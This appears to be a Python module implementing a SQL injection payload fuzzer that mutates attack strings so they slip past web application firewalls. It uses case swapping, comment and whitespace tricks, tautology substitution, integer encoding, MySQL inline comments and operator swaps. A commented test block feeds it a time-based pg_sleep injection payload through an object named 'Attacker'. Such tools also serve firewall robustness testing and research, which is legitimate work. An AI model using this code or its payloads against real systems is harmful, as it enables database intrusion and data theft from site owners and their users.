import re
import random
import string
import random
import re
import sqlparse


def type_check(object_to_check, type_to_check, param_name):
    if not isinstance(object_to_check, type_to_check):
        raise TypeError(
            "{} is not {} but {}".format(
                param_name, type_to_check, type(object_to_check)
            )
        )


def replace_nth(candidate, sub, wanted, n):
    """Replace the n-th occurrence of a portion of the candidate with wanted.

    Arguments:
        candidate (str) : the string to be modified
        sub (str) 		: regexp containing what to substitute
        wanted (str) 	: the string that will replace sub
        n (int)			: the index of the occurrence to replace

    Raises:
        TypeError : bad type passed as arguments

    Returns:
        (str) : the modified string
    """
    type_check(candidate, str, "candidate")
    type_check(sub, str, "sub")
    type_check(wanted, str, "wanted")
    type_check(n, int, "n")
    match = [m for m in re.finditer(re.escape(sub), candidate)][n - 1]
    before = candidate[:match.start()]
    after = candidate[match.end():]
    result = before + wanted + after
    return result


def replace_random(candidate, sub, wanted):
    """Replace one picked at random of the occurrence of sub inside candidate with wanted.

    Arguments:
        candidate (str) : the string to be modified
        sub (str) 		: regexp containing what to substitute
        wanted (str) 	: the string that will replace sub

    Raises:
        TypeError : bad type passed as arguments

    Returns:
        (str) : the modified string
    """
    type_check(candidate, str, "candidate")
    type_check(sub, str, "sub")
    type_check(wanted, str, "wanted")

    occurrences = list(re.finditer(sub, candidate))
    if not occurrences:
        return candidate

    match = random.choice(occurrences)

    before = candidate[:match.start()]
    after = candidate[match.end():]
    result = before + wanted + after

    return result


def filter_candidates(symbols, payload):
    """It removes all the symbols that are not contained inside the input payload string.

    Arguments:
        symbols (dict)  : dictionary of symbols to filter (using the key)
        payload (str)   : the payload to use for the filtering

    Raises:
        TypeError : bad types passed as argument

    Returns:
        list : a list containing all the symbols that are contained inside the payload.

    """
    type_check(symbols, dict, "symbols")
    type_check(payload, str, "payload")

    return [s for s in symbols.keys() if re.search(r'{}'.format(re.escape(s)), payload)]


def random_char(spaces=True):
    """Returns a random character.

    Keyword Arguments:
        spaces (bool) : include spaces [default = True]

    Raises:
        TypeError: spaces not bool


    Returns:
        str : random character
    """

    type_check(spaces, bool, "spaces")
    chars = string.digits + string.ascii_letters + string.punctuation
    if spaces:
        chars += string.whitespace
    return random.choice(chars)


def random_string(max_len=5, spaces=True):
    """It creates a random string.

    Keyword Arguments:
        max_length (int) : the maximum length of the string [default=5]
        spaces (bool) : if True, all the printable character will be considered. Else, only letters and digits [default=True]

    Raises:
        TypeError: bad type passed as argument

    Returns:
        (str) : random string

    """
    type_check(max_len, int, "max_length")
    type_check(spaces, bool, "spaces")

    return "".join(
        [random_char(spaces=spaces) for i in range(random.randint(1, max_len))]
    )


def string_tautology():
    """Returns a random tautology chosen from a fixed set.

    Returns:
        (str) : string containing a tautology
    """
    # TODO: remove magic numbers, move it at top of document
    value_s = random_string(random.randint(1, 5))

    tautologies = [
        # Strings - equals
        "'{}'='{}'".format(value_s, value_s),
        "'{}' LIKE '{}'".format(value_s, value_s),
        "'{}'='{}'".format(value_s, value_s),
        "'{}' LIKE '{}'".format(value_s, value_s),
        # Strings - not equal
        "'{}'!='{}'".format(value_s, value_s + random_string(1, spaces=False)),
        "'{}'<>'{}'".format(value_s, value_s + random_string(1, spaces=False)),
        "'{}' NOT LIKE '{}'".format(value_s, value_s + random_string(1, spaces=False)),
        "'{}'!='{}'".format(value_s, value_s + random_string(1, spaces=False)),
        "'{}'<>'{}'".format(value_s, value_s + random_string(1, spaces=False)),
        "'{}' NOT LIKE '{}'".format(value_s, value_s + random_string(1, spaces=False)),
    ]

    return random.choice(tautologies)


def string_contradiction():
    """Returns a random contradiction chosen from a fixed set.

    Returns:
        (str) : string containing a contradiction
    """
    value_s = random_string(random.randint(1, 5))

    contradictions = [
        # Strings - equals
        "'{}'='{}'".format(value_s, value_s + random_string(1, spaces=False)),
        "'{}' LIKE '{}'".format(value_s, value_s + random_string(1, spaces=False)),
        "'{}'='{}'".format(value_s, value_s + random_string(1, spaces=False)),
        "'{}' LIKE '{}'".format(value_s, value_s + random_string(1, spaces=False)),
        # Strings - not equal
        "'{}'!='{}'".format(value_s, value_s),
        "'{}'<>'{}'".format(value_s, value_s),
        "'{}' NOT LIKE '{}'".format(value_s, value_s),
        "'{}'!='{}'".format(value_s, value_s),
        "'{}'<>'{}'".format(value_s, value_s),
        "'{}' NOT LIKE '{}'".format(value_s, value_s),
    ]

    return random.choice(contradictions)


def num_tautology():
    """Returns a random tautology explicit using numbers chosen from a fixed set.

    Returns:
        (str) : string containing a tautology
    """
    value_n = random.randint(1, 10000)

    tautologies = [
        # Numbers - equal
        "{}={}".format(value_n, value_n),
        "{} LIKE {}".format(value_n, value_n),
        # Numbers - not equal
        "{}!={}".format(value_n, value_n + 1),
        "{}<>{}".format(value_n, value_n + 1),
        "{} NOT LIKE {}".format(value_n, value_n + 1),
        "{} IN ({},{},{})".format(value_n, value_n - 1, value_n, value_n + 1),
    ]

    return random.choice(tautologies)


def num_contradiction():
    """Returns a random contradiction explicit using numbers chosen from a fixed set.

    Returns:
        (str) : string containing a contradiction
    """
    value_n = random.randint(1, 10000)

    contradictions = [
        # Numbers - equal
        "{}={}".format(value_n, value_n + 1),
        "{} LIKE {}".format(value_n, value_n + 1),
        # Numbers - not equal
        "{}!={}".format(value_n, value_n),
        "{}<>{}".format(value_n, value_n),
        "{} NOT LIKE {}".format(value_n, value_n),
        "{} NOT IN ({},{},{})".format(value_n, value_n - 1, value_n, value_n + 1),
    ]

    return random.choice(contradictions)


def reset_inline_comments(payload: str):
    """
    Removes a randomly chosen multi-line comment content.

    Arguments:
        payload: query payload (string)

    Returns:
        str: payload modified
    """
    positions = list(re.finditer(r"/\*[^(/\*|\*/)]*\*/", payload))

    if not positions:
        return payload

    pos = random.choice(positions).span()

    replacements = ["/**/"]

    replacement = random.choice(replacements)

    new_payload = payload[: pos[0]] + replacement + payload[pos[1]:]

    return new_payload


def logical_invariant(payload: str):
    """
    Adds an invariant boolean condition to the payload.

    E.g., expression OR False
    where expression is a numeric or string tautology such as 1=1 or 'x'<>'y'

    Arguments:
        payload: query payload (string)

    Returns:
        str: payload modified
    """
    # rule matching numeric tautologies
    num_tautologies_pos = list(re.finditer(r'\b(\d+)(\s*=\s*|\s+(?i:like)\s+)\1\b', payload))
    num_tautologies_neg = list(re.finditer(r'\b(\d+)(\s*(!=|<>)\s*|\s+(?i:not like)\s+)(?!\1\b)\d+\b', payload))
    # rule matching string tautologies
    string_tautologies_pos = list(
        re.finditer(r'(\'|\")([a-zA-Z]{1}[\w#@$]*)\1(\s*=\s*|\s+(?i:like)\s+)(\'|\")\2\4', payload))
    string_tautologies_neg = list(re.finditer(
        r'(\'|\")([a-zA-Z]{1}[\w#@$]*)\1(\s*(!=|<>)\s*|\s+(?i:not like)\s+)(\'|\")(?!\2)([a-zA-Z]{1}[\w#@$]*)\5',
        payload))
    results = num_tautologies_pos + num_tautologies_neg + string_tautologies_pos + string_tautologies_neg
    # print("8", results)
    if not results:
        return payload
    candidate = random.choice(results)

    pos = candidate.end()

    replacement = random.choice(
        [
            # AND True
            " AND 1",
            " AND True",
            " AND " + num_tautology(),
            " AND " + string_tautology(),
            # OR False
            " OR 0",
            " OR False",
            " OR " + num_contradiction(),
            " OR " + string_contradiction(),
        ]
    )

    new_payload = payload[:pos] + replacement + payload[pos:]

    return new_payload


def change_tautologies(payload: str):
    """
    Replaces a randomly chosen numeric/string tautology with another one.

    Arguments:
        payload: query payload (string)

    Returns:
        str: payload modified
    """
    # rules matching numeric tautologies
    num_tautologies_pos = list(re.finditer(r'\b(\d+)(\s*=\s*|\s+(?i:like)\s+)\1\b', payload))
    num_tautologies_neg = list(re.finditer(r'\b(\d+)(\s*(!=|<>)\s*|\s+(?i:not like)\s+)(?!\1\b)\d+\b', payload))
    # rule matching string tautologies
    string_tautologies_pos = list(
        re.finditer(r'(\'|\")([a-zA-Z]{1}[\w#@$]*)\1(\s*=\s*|\s+(?i:like)\s+)(\'|\")\2\4', payload))
    string_tautologies_neg = list(re.finditer(
        r'(\'|\")([a-zA-Z]{1}[\w#@$]*)\1(\s*(!=|<>)\s*|\s+(?i:not like)\s+)(\'|\")(?!\2)([a-zA-Z]{1}[\w#@$]*)\5',
        payload))
    results = num_tautologies_pos + num_tautologies_neg + string_tautologies_pos + string_tautologies_neg
    if not results:
        return payload
    candidate = random.choice(results)

    while True:
        replacements = [num_tautology(), string_tautology()]
        replacement = random.choice(replacements)
        if candidate != replacement:
            break

    new_payload = (
            payload[: candidate.span()[0]] + replacement + payload[candidate.span()[1]:]
    )

    return new_payload


def spaces_to_comments(payload: str):
    """
    Replaces a randomly chosen space character with a multi-line comment (and vice-versa).

    Arguments:
        payload: query payload (string)

    Returns:
        str: payload modified
    """
    # TODO: make it selectable (can be mixed with other strategies)
    symbols = {" ": ["/**/"], "/**/": [" "]}

    symbols_in_payload = filter_candidates(symbols, payload)

    if not symbols_in_payload:
        return payload

    # Randomly choose symbol
    candidate_symbol = random.choice(symbols_in_payload)
    # Check for possible replacements
    replacements = symbols[candidate_symbol]
    # Choose one replacement randomly
    candidate_replacement = random.choice(replacements)

    # Apply mutation at one random occurrence in the payload
    return replace_random(payload, re.escape(candidate_symbol), candidate_replacement)


def spaces_to_whitespaces_alternatives(payload: str):
    """
    Replaces a randomly chosen whitespace character with another one.

    Arguments:
        payload: query payload (string)

    Returns:
        str: payload modified
    """
    symbols = {
        " ": ["\t", "\n", "\f", "\v", "\xa0"],
        "\t": [" ", "\n", "\f", "\v", "\xa0"],
        "\n": ["\t", " ", "\f", "\v", "\xa0"],
        "\f": ["\t", "\n", " ", "\v", "\xa0"],
        "\v": ["\t", "\n", "\f", " ", "\xa0"],
        "\xa0": ["\t", "\n", "\f", "\v", " "],
    }

    symbols_in_payload = filter_candidates(symbols, payload)

    if not symbols_in_payload:
        return payload

    # Randomly choose symbol
    candidate_symbol = random.choice(symbols_in_payload)
    # Check for possible replacements
    replacements = symbols[candidate_symbol]
    # Choose one replacement randomly
    candidate_replacement = random.choice(replacements)

    # Apply mutation at one random occurrence in the payload
    return replace_random(payload, re.escape(candidate_symbol), candidate_replacement)


def random_case(payload: str):
    """
    Randomly changes the capitalization of the SQL keywords in the input payload.

    Arguments:
        payload: query payload (string)

    Returns:
        str: payload modified
    """
    tokens = []
    # Check if the payload is correctly parsed (safety check).
    try:
        parsed_payload = sqlparse.parse(payload)
    except Exception:
        # Just return the input payload if it cannot be parsed to avoid stopping the fuzzing
        return payload
    for t in parsed_payload:
        tokens.extend(list(t.flatten()))

    sql_keywords = set(sqlparse.keywords.KEYWORDS_COMMON.keys())
    # sql_keywords = ' '.join(list(sqlparse.keywords.KEYWORDS_COMMON..keys()) + list(sqlparse.keywords.KEYWORDS.keys()))

    # Make sure case swapping is applied only to SQL tokens
    new_payload = []
    for token in tokens:
        if token.value.upper() in sql_keywords:
            new_token = ''.join([c.swapcase() if random.random() > 0.5 else c for c in token.value])
            new_payload.append(new_token)
        else:
            new_payload.append(token.value)

    return "".join(new_payload)


def comment_rewriting(payload: str):
    """
    Changes the content of a randomly chosen in-line or multi-line comment.

    Arguments:
        payload: query payload (string)

    Returns:
        str: payload modified
    """
    p = random.random()
    if p < 0.5 and ("#" in payload or "-- " in payload):
        return payload + random_string(2)
    elif p >= 0.5 and re.search(r"/\*[^(/\*|\*/)]*\*/", payload):
        return replace_random(payload, r"/\*[^(/\*|\*/)]*\*/", "/*" + random_string() + "*/")
    else:
        return payload


def swap_int_repr(payload: str):
    """
    Changes the representation of a randomly chosen numerical constant with an equivalent one.

    Arguments:
        payload: query payload (string)

    Returns:
        str: payload modified
    """
    candidates = list(re.finditer(r'\b\d+\b', payload))

    if not candidates:
        return payload

    candidate_pos = random.choice(candidates).span()

    candidate = payload[candidate_pos[0]: candidate_pos[1]]

    replacements = [
        hex(int(candidate)),
        "(SELECT {})".format(candidate),
        # "({})".format(candidate),
        # "OCT({})".format(int(candidate)),
        # "HEX({})".format(int(candidate)),
        # "BIN({})".format(int(candidate))
    ]

    replacement = random.choice(replacements)

    return payload[: candidate_pos[0]] + replacement + payload[candidate_pos[1]:]


def swap_keywords(payload: str):
    """
    Replaces a randomly chosen SQL operator with a semantically equivalent one.

    Arguments:
        payload: query payload (string)
        pos: mutation position

    Returns:
        str: payload modified
    """
    replacements = {
        # OR
        "||": [" OR ", " or "],
        "OR": ["||", "or"],
        "or": ["OR", "||"],
        # AND
        "&&": [" AND ", " and "],
        "AND": ["&&", "and"],
        "and": ["AND", "&&"],
        # Not equals
        "<>": ["!=", " NOT LIKE ", " not like "],
        "!=": ["<>", " NOT LIKE ", " not like "],
        "NOT LIKE": ["not like"],
        "not like": ["NOT LIKE"],
        # Equals
        "=": [" LIKE ", " like "],
        "LIKE": ["like"],
        "like": ["LIKE"]
    }

    # Use sqlparse to tokenize the payload in order to better match keywords,
    # even when they are composed by multiple keywords such as "NOT LIKE"
    tokens = []
    # Check if the payload is correctly parsed (safety check).
    try:
        parsed_payload = sqlparse.parse(payload)
    except Exception:
        # Just return the input payload if it cannot be parsed to avoid stopping the fuzzing
        return payload
    for t in parsed_payload:
        tokens.extend(list(t.flatten()))

    indices = [idx for idx, token in enumerate(tokens) if token.value in replacements]
    if not indices:
        return payload

    target_idx = random.choice(indices)
    # target_idx = pos
    new_payload = "".join(
        [random.choice(replacements[token.value]) if idx == target_idx else token.value for idx, token in
         enumerate(tokens)])

    return new_payload


def command_injection(payload: str):
    new_payload = spaces_to_comments(payload)
    res = comment_rewriting(new_payload)
    return res


def where_rewriting(payload: str):
    # Define the two possible transformations
    def transform_and_true(match):
        return f"where {match.group(1)} and True"

    # Choose a random transformation
    transformation = random.choice([transform_and_true, transform_and_true])
    # Apply the chosen transformation
    transformed_query = re.sub(r'where\s+(\S+)', transformation, payload, flags=re.IGNORECASE)
    return transformed_query


def inline_comment(payload: str):

    tokens = []
    # Check if the payload is correctly parsed (safety check).
    try:
        parsed_payload = sqlparse.parse(payload)
    except Exception:
        # Just return the input payload if it cannot be parsed to avoid stopping the fuzzing
        return payload
    for t in parsed_payload:
        tokens.extend(list(t.flatten()))

    sql_keywords = set(sqlparse.keywords.KEYWORDS_COMMON.keys())
    new_payload = []
    for token in tokens:
        if token.value.upper() in sql_keywords:
            if random.random() > 0.5:
                new_payload.append(f"/*!{token.value}*/")
            else:
                new_payload.append(token.value)
        else:
            new_payload.append(token.value)
    return "".join(new_payload)


class SqlFuzzer(object):
    """SqlFuzzer class"""

    strategies = [
        random_case,  # Case Swapping
        spaces_to_comments,
        spaces_to_whitespaces_alternatives,  # Whitespace Substitution
        command_injection,  # Comment Injection = spaces_to_comments + comment_rewriting
        comment_rewriting,  # Comment Rewriting
        swap_int_repr,  # Integer Encoding
        
        swap_keywords,  # Operator Swapping
        logical_invariant,  # Logical Invariant
        inline_comment, # Inline Comment
        change_tautologies,  # Tautology Substitution
        where_rewriting,  # Where Rewriting
        reset_inline_comments,
        
        
    ]

    def __init__(self, payload):
        self.initial_payload = payload
        self.payload = payload

    def fuzz(self, pos):
        strategy = self.strategies[pos]

        self.payload = strategy(self.payload)
        # print(self.payload)

        return self.payload

    def current(self):
        return self.payload

    def reset(self):
        self.payload = self.initial_payload
        return self.payload
    def update(self):
        self.initial_payload = self.payload

# # 测试代码
# payload_list = []
# sql = "\"\"\" or pg_sleep  ( __TIME__  )  --\""
# Attacker = SqlFuzzer(sql)
# Attacker.fuzz(0)
# payload_list.append(Attacker.current())
# Attacker = SqlFuzzer(sql)
# Attacker.fuzz(1)
# payload_list.append(Attacker.current())
# Attacker = SqlFuzzer(sql)
# Attacker.fuzz(2)
# payload_list.append(Attacker.current())
# Attacker = SqlFuzzer(sql)
# Attacker.fuzz(3)
# payload_list.append(Attacker.current())
# Attacker = SqlFuzzer(sql)
# Attacker.fuzz(4)
# payload_list.append(Attacker.current())
# Attacker = SqlFuzzer(sql)
# Attacker.fuzz(5)
# payload_list.append(Attacker.current())
# Attacker = SqlFuzzer(sql)
# Attacker.fuzz(6)
# payload_list.append(Attacker.current())
# Attacker = SqlFuzzer(sql)
# Attacker.fuzz(7)
# payload_list.append(Attacker.current())
# Attacker = SqlFuzzer(sql)
# Attacker.fuzz(8)
# payload_list.append(Attacker.current())
# Attacker.fuzz(9)
# payload_list.append(Attacker.current())
# Attacker.fuzz(10)
# payload_list.append(Attacker.current())
# Attacker.fuzz(11)
# payload_list.append(Attacker.current())
# print(payload_list)
